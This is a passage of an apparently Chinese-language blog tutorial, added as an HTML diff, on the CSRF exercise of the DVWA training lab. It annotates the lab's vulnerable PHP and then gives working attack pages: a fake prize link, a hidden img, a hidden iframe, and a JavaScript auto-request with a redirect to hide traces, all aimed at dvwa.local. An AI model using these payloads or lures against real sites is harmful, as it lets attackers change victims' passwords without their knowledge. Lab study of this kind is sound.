@@ -1,0 +1,932 @@
+<!DOCTYPE html>
+<html lang="en,zh-CN,default">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/undefined/pace/pace-theme-pace-theme-center-atom.min.css">
+  <script src="/undefined/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"caixuya.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"B5HBQCBE1B","apiKey":"ea181e93e7b10c0d94c8e758b7eb25ab","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"输入关键字","hits_empty":"没有找到与「${query}」相关的内容","hits_stats":"${hits}条相关记录，共耗时 ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是CSRF（Cross-Site Request Forgery）？CSRF是一种攻击方式，攻击者诱导受害者在已登录的Web应用程序上执行非本意的操作。 攻击原理：  受害者登录了目标网站A（如网银） 浏览器保存了网站A的Cookie 受害者访问攻击者构造的恶意网站B 恶意网站B">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA - CSRF (跨站请求伪造) 攻防练习详解">
+<meta property="og:url" content="http://caixuya.github.io/2025/11/20/CSRF_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="tia的学习笔记">
+<meta property="og:description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是CSRF（Cross-Site Request Forgery）？CSRF是一种攻击方式，攻击者诱导受害者在已登录的Web应用程序上执行非本意的操作。 攻击原理：  受害者登录了目标网站A（如网银） 浏览器保存了网站A的Cookie 受害者访问攻击者构造的恶意网站B 恶意网站B">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-11-20T15:31:37.109Z">
+<meta property="article:modified_time" content="2025-11-20T15:29:06.455Z">
+<meta property="article:author" content="caixuya">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://caixuya.github.io/2025/11/20/CSRF_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>DVWA - CSRF (跨站请求伪造) 攻防练习详解 | tia的学习笔记</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="tia的学习笔记" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">tia的学习笔记</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-目录">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>目录</a>
+
+  </li>
+        <li class="menu-item menu-item-站点地图">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-关于我">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于我</a>
+
+  </li>
+        <li class="menu-item menu-item-开往">
+
+    <a href="/travelling/" rel="section"><i class="fa fa-paper-plane fa-fw"></i>开往</a>
+
+  </li>
+        <li class="menu-item menu-item-给我写信">
+
+    <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=vY_MiY2FhI2Ojf3MzJPe0tA" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>给我写信</a>
+
+  </li>
+        <li class="menu-item menu-item-公益404">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/CSRF_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="caixuya">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tia的学习笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DVWA - CSRF (跨站请求伪造) 攻防练习详解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:29:06" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>17k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>16 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
+<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
+<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
+<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
+<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
+<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
+</ul>
+<hr>
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是CSRF（Cross-Site-Request-Forgery）？"><a href="#什么是CSRF（Cross-Site-Request-Forgery）？" class="headerlink" title="什么是CSRF（Cross-Site Request Forgery）？"></a>什么是CSRF（Cross-Site Request Forgery）？</h3><p>CSRF是一种攻击方式，攻击者诱导受害者在已登录的Web应用程序上执行非本意的操作。</p>
+<p><strong>攻击原理：</strong></p>
+<ol>
+<li>受害者登录了目标网站A（如网银）</li>
+<li>浏览器保存了网站A的Cookie</li>
+<li>受害者访问攻击者构造的恶意网站B</li>
+<li>恶意网站B向网站A发起请求</li>
+<li>浏览器自动带上网站A的Cookie</li>
+<li>网站A认为是合法请求，执行操作</li>
+</ol>
+<p><strong>危害：</strong></p>
+<ul>
+<li>修改用户密码</li>
+<li>转账汇款</li>
+<li>修改个人资料</li>
+<li>发送恶意邮件</li>
+<li>购买商品</li>
+<li>删除数据</li>
+</ul>
+<p><strong>与XSS的区别：</strong></p>
+<ul>
+<li>XSS：注入恶意代码在目标网站执行</li>
+<li>CSRF：利用用户的登录状态发起请求</li>
+</ul>
+<hr>
+<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>无任何CSRF防护的密码修改功能。</p>
+<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否提交了修改密码的请求</span></span><br><span class="line"><span class="comment">// isset() - 检查变量是否已设置且非NULL</span></span><br><span class="line"><span class="comment">// $_GET - 从URL参数获取数据</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取新密码和确认密码</span></span><br><span class="line">    <span class="comment">// $_GET[ &#x27;password_new&#x27; ] - 新密码</span></span><br><span class="line">    <span class="comment">// $_GET[ &#x27;password_conf&#x27; ] - 确认密码</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题1：只检查两次输入是否一致，不验证旧密码 ★★★</span></span><br><span class="line">    <span class="comment">// == - 比较运算符，判断两个值是否相等</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 两次密码输入一致</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对密码进行MD5哈希</span></span><br><span class="line">        <span class="comment">// md5() - 将字符串转换为32位十六进制MD5哈希值</span></span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 问题2：SQL注入漏洞 - 直接拼接变量 ★★★</span></span><br><span class="line">        <span class="comment">// $_SESSION[ &#x27;username&#x27; ] - 从session获取当前登录用户名</span></span><br><span class="line">        <span class="comment">// 这里存在SQL注入风险（虽然session相对可信）</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构建SQL更新语句</span></span><br><span class="line">        <span class="comment">// UPDATE - SQL更新命令</span></span><br><span class="line">        <span class="comment">// SET password = &#x27;$pass_new&#x27; - 设置新密码</span></span><br><span class="line">        <span class="comment">// WHERE user = ... - 指定要更新的用户</span></span><br><span class="line">        <span class="variable">$query</span>  = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="variable">$_SESSION</span>[ <span class="string">&#x27;username&#x27;</span> ] . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行SQL查询</span></span><br><span class="line">        <span class="comment">// mysql_query() - 执行MySQL查询（已废弃）</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出成功信息</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 两次密码输入不一致</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出错误信息</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭数据库连接</span></span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>核心问题：</strong></p>
+<ol>
+<li><strong>使用GET请求</strong> - 敏感操作应该用POST</li>
+<li><strong>无CSRF Token</strong> - 无法验证请求来源</li>
+<li><strong>无验证码</strong> - 可以自动化攻击</li>
+<li><strong>不验证旧密码</strong> - 只要用户登录就能改密码</li>
+<li><strong>无Referer检查</strong> - 不验证请求来源页面</li>
+</ol>
+<p><strong>攻击条件：</strong></p>
+<ul>
+<li>受害者已登录DVWA</li>
+<li>受害者访问攻击者页面</li>
+<li>浏览器会自动发送Cookie</li>
+</ul>
+<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="方法1：构造恶意链接"><a href="#方法1：构造恶意链接" class="headerlink" title="方法1：构造恶意链接"></a>方法1：构造恶意链接</h4><p><strong>步骤1：分析正常请求</strong></p>
+<p>正常修改密码的URL：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>dvwa.local<span class="regexp">/dvwa/</span>vulnerabilities<span class="regexp">/csrf/</span>?password_new=<span class="number">123456</span>&amp;password_conf=<span class="number">123456</span>&amp;Change=Change</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤2：创建攻击页面</strong></p>
+<p>创建 <code>csrf_attack.html</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>恭喜中奖！<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>恭喜您中奖了！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>点击下方按钮领取奖品<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- ★★★ 恶意链接：修改DVWA密码 ★★★ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://dvwa.local/dvwa/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change&quot;</span>&gt;</span></span><br><span class="line">        领取奖品</span><br><span class="line">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤3：诱导用户点击</strong></p>
+<ol>
+<li>受害者已登录DVWA</li>
+<li>受害者点击”领取奖品”链接</li>
+<li>浏览器向DVWA发送请求（自动带上Cookie）</li>
+<li>DVWA认为是合法请求，修改密码为”hacked”</li>
+<li>受害者密码被修改，但可能不知情</li>
+</ol>
+<h4 id="方法2：自动攻击（无需点击）"><a href="#方法2：自动攻击（无需点击）" class="headerlink" title="方法2：自动攻击（无需点击）"></a>方法2：自动攻击（无需点击）</h4><p>使用图片标签自动发起请求：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>热门新闻<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>今日头条<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>正在加载内容...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- ★★★ 隐藏的攻击：使用img标签 ★★★ --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 浏览器加载页面时会自动请求img的src --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 用户完全不知情！ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://dvwa.local/dvwa/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>原理：</strong></p>
+<ul>
+<li>浏览器加载页面时自动请求图片</li>
+<li>即使是GET请求，浏览器也会发送</li>
+<li>Cookie自动附加</li>
+<li>用户完全不知道发生了什么</li>
+</ul>
+<h4 id="方法3：使用iframe隐藏攻击"><a href="#方法3：使用iframe隐藏攻击" class="headerlink" title="方法3：使用iframe隐藏攻击"></a>方法3：使用iframe隐藏攻击</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>正常网页<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>欢迎访问我的博客<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>这里是一些有趣的内容...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- ★★★ 使用iframe隐藏攻击 ★★★ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://dvwa.local/dvwa/vulnerabilities/csrf/?password_new=pwned&amp;password_conf=pwned&amp;Change=Change&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法4：使用JavaScript自动提交"><a href="#方法4：使用JavaScript自动提交" class="headerlink" title="方法4：使用JavaScript自动提交"></a>方法4：使用JavaScript自动提交</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>加载中...<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>页面加载中，请稍候...<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// ★★★ JavaScript自动发起请求 ★★★</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 页面加载完成后自动执行</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 创建img元素</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 设置src，浏览器会自动发送GET请求</span></span></span><br><span class="line"><span class="language-javascript">            img.<span class="property">src</span> = <span class="string">&quot;http://dvwa.local/dvwa/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 请求完成后重定向到正常页面（掩盖踪迹）</span></span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;http://www.example.com&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span 